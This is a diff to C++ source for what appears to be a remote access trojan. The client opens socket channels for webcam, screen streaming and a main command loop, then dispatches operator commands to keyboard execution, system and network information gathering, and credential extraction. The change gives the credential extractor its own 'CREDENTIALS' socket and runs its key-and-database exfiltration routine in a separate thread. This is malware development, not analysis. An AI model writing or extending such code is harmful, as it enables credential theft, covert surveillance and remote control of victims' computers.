@@ -52,7 +52,8 @@ std::vector<std::string> socket_conf_list = {"MAIN",
                                              "PERMISSION",
                                              "WEBCAM",
                                              "SCREEN",
-                                             "SCREEN_EVENT"};
+                                             "SCREEN_EVENT",
+                                             "CREDENTIALS"};
 
 void add_connection(const std::string &key, Stream &stream) {
     std::lock_guard<std::mutex> lock(connections_mutex);
@@ -143,12 +144,14 @@ int main(int argc = 0, char *argv[] = nullptr) {
             stream = *get_connection("SCREEN");
             Stream altStream = *get_connection("SCREEN_EVENT");
             ScreenStreamer screenStreamer(stream, altStream);
+            stream = *get_connection("CREDENTIALS");
+            CredentialsExtractor credentialsExtractor(stream);
             stream = *get_connection("MAIN");
             MessageBoxGUI messageBoxGUI(stream);
             KeyboardExecuter keyboardExecuter(stream);
             SystemInformation sysInfo(stream);
             NetworkInformation networkInfo(stream);
-            CredentialsExtractor credentialsExtractor(stream);
+
 
 
             bool streamListening = true;
@@ -241,7 +244,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
                         break;
                     }
                     case 15:{
-                        credentialsExtractor.sendKeyAndDatabase();
+                        threadGen.runInNewThread(&credentialsExtractor, &CredentialsExtractor::sendKeyAndDatabase);
                         break;
                     }
 //#endif
@@ -269,7 +272,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
                         break;
                     }
 #ifdef WEBCAM
-                    case 22: { // downloadContent screen streaming TODO fix screen controlling and new thread and socket
+                    case 22: { // downloadContent screen streaming TODO fix screen controlling
                         threadGen.runInNewThread(&screenStreamer, &ScreenStreamer::startStreaming, jsonObject);
                         break;
                     }
